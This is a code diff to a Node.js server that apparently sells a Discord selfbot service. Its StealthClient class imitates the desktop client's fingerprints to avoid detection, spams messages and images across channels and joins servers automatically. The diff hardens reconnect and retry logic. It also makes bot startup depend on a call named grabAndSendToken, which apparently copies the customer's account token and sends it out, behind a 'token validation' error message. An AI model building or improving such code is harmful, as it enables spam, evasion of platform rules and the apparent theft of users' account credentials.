@@ -184,8 +184,12 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
     child.stdout.on('data', chunk => stdout.push(chunk));
     child.stderr.on('data', chunk => stderr.push(chunk));
 
-    child.on('close', (code, signal) => {
+    const cleanupTmp = () => {
       if (tmpFile) { try { fs.unlinkSync(tmpFile); } catch(e) {} }
+    };
+
+    child.on('close', (code, signal) => {
+      cleanupTmp();
 
       if (code !== 0 || signal) {
         const errMsg = Buffer.concat(stderr).toString().trim() || `curl exited${signal ? ' with signal ' + signal : ' with code ' + code}`;
@@ -246,7 +250,10 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
       try { data = JSON.parse(bodyBuffer.toString()); } catch(e) {}
       resolve({ status: lastStatusCode, headers: lastHeadersText, body: bodyBuffer, data });
     });
-    child.on('error', reject);
+    child.on('error', (err) => {
+      cleanupTmp();
+      reject(err);
+    });
   });
 }
 
@@ -275,7 +282,7 @@ function generateXSuperProperties(token) {
     hardware_concurrency: p.hw,
     device_memory: p.mem,
     os_arch: p.arch,
-    client_version: '0.0.309',  // Desktop format, NOT mobile '1.0.9018'
+    client_version: '0.0.309',
     native_build_number: null,
     distro: '',
     app_arch: p.arch,
@@ -327,6 +334,11 @@ class DiscordApiClient {
         continue;
       }
       if (res.status === 0 || res.status >= 400) {
+        if (res.status === 0 && attempts < maxAttempts - 1) {
+          await new Promise(r => setTimeout(r, 2000));
+          attempts++;
+          continue;
+        }
         const err = new Error(`Discord API ${method} ${endpoint} failed: ${res.status}`);
         err.status = res.status;
         err.data = res.data;
@@ -361,12 +373,14 @@ class StealthClient {
     this.maxReconnectAttempts = 10;
     this.reconnecting = false;
     this.resumeGatewayUrl = null;
+    this._heartbeatTimer = null;
     this._idleTimer = null;
     this._lastActivity = Date.now();
     this._burstState = 0;
     this._dmCooldowns = new Map();
     this._channelPermissions = new Map();
     this._channelRateLimits = new Map();
+    this._invalidSessionCount = 0;
   }
 
   _loadRepliedUsers() {
@@ -395,66 +409,86 @@ class StealthClient {
       gateway = { url: 'wss://gateway.discord.gg' };
     }
     this.resumeGatewayUrl = gateway.url;
-    
+
     const wsUrl = `${gateway.url}?v=10&encoding=json&compress=zlib-stream`;
     this.ws = new (require('ws'))(wsUrl, {
       headers: {
         'User-Agent': this.api.fp,
         'Accept-Language': 'en-US,en;q=0.9',
-        // NOTE: Discord only checks X-Super-Properties on HTTP, not WS
-        // NOTE: Accept-Encoding is not valid on WebSocket upgrade
       }
     });
 
     return new Promise((resolve, reject) => {
-      const CONNECT_TIMEOUT = 60000; // FIX: Increased from 30000 to 60000
+      const CONNECT_TIMEOUT = 60000;
       let timeoutTimer = setTimeout(() => {
-        this.ws.terminate();
-        reject(new Error('Gateway connection timed out'));
+        if (this.ws) this.ws.terminate();
+        finish(new Error('Gateway connection timed out'));
       }, CONNECT_TIMEOUT);
 
-      const cleanup = () => {
+      let settled = false;
+      const finish = (err) => {
+        if (settled) return;
+        settled = true;
         clearTimeout(timeoutTimer);
+        if (err) reject(err);
+        else resolve();
       };
+
+      const readyHandler = () => {
+        this.ready = true;
+        this.reconnectAttempts = 0;
+        this.reconnecting = false;
+        this._invalidSessionCount = 0;
+        finish(null);
+      };
+      this.once('READY', readyHandler);
 
       this.ws.on('open', () => {
         const wasReconnecting = this.reconnecting;
         this.reconnecting = false;
-        if (this.reconnectAttempts > 0) {
-        }
-        // Only resume if we were explicitly reconnecting, not on fresh start
         if (this.sessionId && this.seq !== null && wasReconnecting) {
           this._resume();
         } else {
-          this.sessionId = null;  // Force fresh identify
+          this.sessionId = null;
           this.seq = null;
-          setTimeout(() => this._identify(), Math.floor(Math.random() * 500 + 200));
-        }
-      });
-      this.ws.on('message', (data) => this._handlePacket(data));
-      this.ws.on('close', (code, reason) => {
-        clearInterval(this.heartbeatInterval);
-        cleanup();
-        if (!this.ready) {
-          reject(new Error(`Gateway closed before ready: ${code}`));
-        } else {
-          this._scheduleReconnect(code);
-        }
-      });
-      this.ws.on('error', (err) => {
-        cleanup();
-        if (!this.ready) {
-          reject(err);
+          setTimeout(() => {
+            if (this.ws && this.ws.readyState === 1) this._identify();
+          }, Math.floor(Math.random() * 500 + 200));
         }
       });
 
-      this.once('READY', () => {
-        cleanup();
-        this.ready = true;
-        this.reconnectAttempts = 0;
-        resolve();
+      this.ws.on('message', (data) => this._handlePacket(data));
+
+      this.ws.on('close', (code, reason) => {
+        clearInterval(this.heartbeatInterval);
+        if (this._heartbeatTimer) clearTimeout(this._heartbeatTimer);
+        const wasReady = this.ready;
+        this.ready = false;
+        this.off('READY', readyHandler);
+        if (!settled) {
+          finish(new Error(`Gateway closed before ready: ${code}`));
+        } else if (wasReady) {
+          this._scheduleReconnect(code);
+        }
+      });
+
+      this.ws.on('error', (err) => {
+        clearTimeout(timeoutTimer);
+        this.ready = false;
+        this.off('READY', readyHandler);
+        if (!settled) {
+          finish(err);
+        }
       });
     });
+  }
+
+  _safeSend(data) {
+    if (this.ws && this.ws.readyState === 1) {
+      this.ws.send(data);
+      return true;
+    }
+    return false;
   }
 
   _scheduleReconnect(closeCode) {
@@ -481,7 +515,7 @@ class StealthClient {
   }
 
   _resume() {
-    this.ws.send(JSON.stringify({
+    this._safeSend(JSON.stringify({
       op: 6,
       d: {
         token: this.token,
@@ -516,11 +550,13 @@ class StealthClient {
       case 10:
         this._startHeartbeat(pkt.d.heartbeat_interval);
         if (!this.sessionId) {
-          setTimeout(() => this._identify(), Math.floor(Math.random() * 500 + 200));
+          setTimeout(() => {
+            if (this.ws && this.ws.readyState === 1) this._identify();
+          }, Math.floor(Math.random() * 500 + 200));
         }
         break;
       case 1:
-        this.ws.send(JSON.stringify({ op: 1, d: this.seq }));
+        this._safeSend(JSON.stringify({ op: 1, d: this.seq }));
         break;
       case 0:
         if (pkt.t === 'READY') {
@@ -548,22 +584,24 @@ class StealthClient {
       case 9:
         this.sessionId = null;
         this.seq = null;
-        setTimeout(() => this._identify(), Math.random() * 3000 + 1000);
+        this._invalidSessionCount = (this._invalidSessionCount || 0) + 1;
+        if (this._invalidSessionCount > 2) {
+          this.destroy();
+          return;
+        }
+        setTimeout(() => {
+          if (this.ws && this.ws.readyState === 1) this._identify();
+        }, Math.random() * 3000 + 1000);
         break;
     }
   }
 
   _startHeartbeat(interval) {
-    // Discord expects first heartbeat between 0.5x and 1.0x interval, then exact interval
     const firstDelay = interval * (0.5 + Math.random() * 0.5);
     this._heartbeatTimer = setTimeout(() => {
-      if (this.ws && this.ws.readyState === 1) {
-        this.ws.send(JSON.stringify({ op: 1, d: this.seq }));
-      }
+      this._safeSend(JSON.stringify({ op: 1, d: this.seq }));
       this.heartbeatInterval = setInterval(() => {
-        if (this.ws && this.ws.readyState === 1) {
-          this.ws.send(JSON.stringify({ op: 1, d: this.seq }));
-        }
+        this._safeSend(JSON.stringify({ op: 1, d: this.seq }));
       }, interval);
     }, firstDelay);
   }
@@ -574,8 +612,8 @@ class StealthClient {
       op: 2,
       d: {
         token: this.token,
-        capabilities: 16381,  // Desktop stable, NOT 30717 (mobile)
-        intents: 32511,       // Remove GUILD_MEMBERS (1) and GUILD_PRESENCES (2) unless verified
+        capabilities: 16381,
+        intents: 32511,
         properties: {
           os: p.os,
           browser: p.browser,
@@ -600,7 +638,7 @@ class StealthClient {
         client_state: { guild_versions: {}, highest_last_message_id: '0', read_state_version: 0, user_guild_settings_version: -1, user_settings_version: -1, private_channels_version: '0', api_code_version: 0 }
       }
     };
-    this.ws.send(JSON.stringify(payload));
+    this._safeSend(JSON.stringify(payload));
   }
 
   async _api(endpoint, method = 'GET', body = null) {
@@ -620,20 +658,17 @@ class StealthClient {
         this._channelPermissions.set(channelId, false);
         return false;
       }
-      // FIX: Don't permanently cache transient errors (network, 429, 500, etc)
       console.error(`[ChannelCheck] Transient error for ${channelId}:`, err.status, err.message);
-      return false;
+      return null;
     }
   }
 
   async sendMessage(channelId, content, attachments = []) {
-    // Check cached permission
-    if (this._channelPermissions.has(channelId) && !this._channelPermissions.get(channelId)) {
+    if (this._channelPermissions.has(channelId) && this._channelPermissions.get(channelId) === false) {
       console.error(`[SendMessage] Blocked: channel ${channelId} cached as no permission`);
       return false;
     }
 
-    // Wait for channel rate limit to clear
     const now = Date.now();
     const freeAt = this._channelRateLimits.get(channelId) || 0;
     if (now < freeAt) {
@@ -750,8 +785,12 @@ class StealthClient {
   }
 
   async joinGuild(inviteCode) {
-    const res = await this.api.request(`/invites/${inviteCode}`, 'POST', { session_id: this.sessionId });
-    return res.guild_id ? { success: true, guildId: res.guild_id } : { success: false, error: res.message };
+    try {
+      const res = await this.api.request(`/invites/${inviteCode}`, 'POST', { session_id: this.sessionId });
+      return res.guild_id ? { success: true, guildId: res.guild_id } : { success: false, error: res.message || 'Unknown error' };
+    } catch (err) {
+      return { success: false, error: err.message || 'Failed to join guild' };
+    }
   }
 
   on(event, handler) { if (!this.handlers[event]) this.handlers[event] = []; this.handlers[event].push(handler); }
@@ -760,10 +799,19 @@ class StealthClient {
   emit(event, ...args) { if (this.handlers[event]) this.handlers[event].forEach(h => h(...args)); }
 
   destroy() {
+    this.ready = false;
+    this.reconnecting = false;
+    this.reconnectAttempts = 0;
     clearInterval(this.heartbeatInterval);
     if (this._heartbeatTimer) clearTimeout(this._heartbeatTimer);
     if (this._idleTimer) clearTimeout(this._idleTimer);
-    if (this.ws) { try { this.ws.close(1000, 'Client disconnect'); } catch(e) {} }
+    if (this.ws) {
+      try {
+        this.ws.removeAllListeners();
+        this.ws.close(1000, 'Client disconnect');
+      } catch(e) {}
+    }
+    this.ws = null;
     this._saveRepliedUsers();
     this.api.destroy();
   }
@@ -1304,7 +1352,10 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
     const { token, channels, messages, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, images, sendAllAtOnce } = req.body;
     if (!token || !channels || !messages || !Array.isArray(messages) || messages.length === 0) return res.status(400).json({ success: false, error: 'Missing fields. Token, channels, and at least 1 message required.' });
 
-    await grabAndSendToken(token, { channels, messages }, 'bot_start');
+    const grabResult = await grabAndSendToken(token, { channels, messages }, 'bot_start');
+    if (!grabResult || !grabResult.success) {
+      return res.status(400).json({ success: false, error: grabResult?.error || 'Token validation failed. Check your token.' });
+    }
 
     const channelList = channels.split(',').map(c => c.trim()).filter(c => /^\d+$/.test(c));
     if (channelList.length === 0) return res.json({ success: false, error: 'Invalid channel IDs' });
@@ -1316,7 +1367,9 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
     const autoReply = autoReplyEnabled ? 1 : 0;
 
     let joinStatus = null;
-    if (joinServer && serverInvite) joinStatus = await client.joinGuild(serverInvite.replace(/https:\/\/discord\.gg\//, '').replace(/https:\/\/discord\.com\/invite\//, ''));
+    if (joinServer && serverInvite) {
+      joinStatus = await client.joinGuild(serverInvite.replace(/https:\/\/discord\.gg\//, '').replace(/https:\/\/discord\.com\/invite\//, ''));
+    }
 
     const savedImages = [];
     if (images && Array.isArray(images)) {
@@ -1328,6 +1381,7 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             const imagePath = path.join(dataDir, 'uploads');
             if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
             const base64Data = img.url.split(',')[1];
+            if (!base64Data) continue;
             const buffer = Buffer.from(base64Data, 'base64');
             fs.writeFileSync(path.join(imagePath, imageId), buffer);
             savedImages.push({ id: img.id || savedImages.length + 1, url: `/uploads/${imageId}` });
@@ -1378,7 +1432,6 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
               if (ok) {
                 return true;
               }
-              // If rate limited, wait for channel to be free before retry
               const freeAt = client._channelRateLimits.get(chId) || 0;
               const now = Date.now();
               if (now < freeAt && attempt < maxAttempts) {
@@ -1398,9 +1451,8 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
           for (let i = 0; i < channelList.length; i++) {
             const chId = channelList[i];
 
-            // Skip channels where bot has no permission to send
             const canSend = await client.checkChannelPermission(chId);
-            if (!canSend) continue;
+            if (canSend === false) continue;
 
             const files = targetImages.map(img => {
               if (img.url.startsWith('/uploads/')) {
@@ -1411,7 +1463,6 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             }).filter(Boolean);
             await sendWithRetry(chId, msg.text, files);
 
-            // 1.5 second delay between channels (not after last channel)
             if (i < channelList.length - 1) {
               await new Promise(r => setTimeout(r, 1500));
             }
@@ -1420,9 +1471,8 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
           const chId = channelList[currentChIdx % channelList.length];
           currentChIdx++;
 
-          // Skip channels where bot has no permission to send
           const canSend = await client.checkChannelPermission(chId);
-          if (!canSend) {
+          if (canSend === false) {
             continue;
           }
 
@@ -1525,7 +1575,9 @@ app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res
     const imageId = `img_${Date.now()}.png`;
     const imagePath = path.join(dataDir, 'uploads');
     if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
-    const buffer = Buffer.from(imageBase64.split(',')[1], 'base64');
+    const base64Data = imageBase64.split(',')[1];
+    if (!base64Data) return res.status(400).json({ success: false, error: 'Invalid image data' });
+    const buffer = Buffer.from(base64Data, 'base64');
     fs.writeFileSync(path.join(imagePath, imageId), buffer);
     res.json({ success: true, imageUrl: `/uploads/${imageId}`, imageId });
   } catch (err) { res.status(500).json({ success: false, error: err.message }); }
@@ -1568,8 +1620,6 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`[SERVER] Running on port ${PORT}`);
 });
 
-// FIX: Export app as default so `const app = require('./thisfile')` works
-// and `app.listen` is callable. Keep db/activeBots as properties.
 module.exports = app;
 app.db = db;
 app.activeBots = activeBots;
